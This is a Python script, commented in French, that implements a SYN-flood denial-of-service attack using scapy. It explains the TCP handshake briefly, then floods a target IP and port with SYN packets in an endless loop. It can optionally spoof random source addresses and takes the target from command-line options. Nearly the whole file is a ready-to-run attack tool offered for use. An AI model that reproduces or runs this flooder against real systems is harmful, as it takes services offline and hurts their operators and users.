#!/usr/bin/python3.5
# -*- coding=utf-8 -*-

#Le SYN flood est une attaque informatique visant à atteindre un déni de service. Elle s'applique dans le cadre du protocole TCP et consiste à envoyer une succession de requêtes SYN vers la cible.

#1. le client demande une connexion en envoyant un message SYN (pour synchronize) au serveur 
#2. le serveur accepte en envoyant un message SYN-ACK (synchronize-acknowledgment) vers le client 
#3. le client répond à son tour avec un message ACK (acknowledgment) ; la connexion est alors établi


import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#Ignorer l'erreur de IPv5 lors l'utilisation de scapy
from scapy.all import *
from Random_IP import Random_IP
import optparse

def syn_dos(ip, port, random_enable=True):
	if random_enable == True:#Si on utilise une adresse IP aléatoire
		while True:
			source_port = random.randint(1024, 65535)#Port de la source
			init_sn = random.randint(1, 65535*63335)#Numéro de séquence TCP
			source_ip = Random_IP()
			#TCP syn flag=0x02
			send(IP(src=source_ip,dst=ip)/TCP(dport=port,sport=source_port,flags=2,seq=init_sn), verbose = False)
	else:
		while True:
			source_port = random.randint(1024, 65535)
			init_sn = random.randint(1, 65535*63335)
			send(IP(dst=ip)/TCP(dport=port,sport=source_port,flags=2,seq=init_sn), verbose = False)

if __name__ == '__main__':
    #Example
    parser = optparse.OptionParser("python3.5 handshake_dos.py -d <IP cible> -p <Port cible> -r <1:Random IP, 2:No Random IP(défault）>")
    #Paramètres
    parser.add_option('-d', dest = 'dst_ip', type = 'string', help = 'IP cible')
    parser.add_option('-p', dest = 'dst_port', type = 'int', help = 'Port cible')
    parser.add_option('-r', dest = 'random', type = 'int', help = 'Random IP')
    (options, args) = parser.parse_args()
    #Montrer l'example si la commande sans paramètre
    if (options.dst_ip == None) or (options.dst_port == None):
        print(parser.usage)
        exit(0)
    else:
        destination_ip = options.dst_ip
        destination_port = options.dst_port
    if options.random == 1:
        syn_dos(destination_ip, destination_port, True)
    else:
        syn_dos(destination_ip, destination_port)

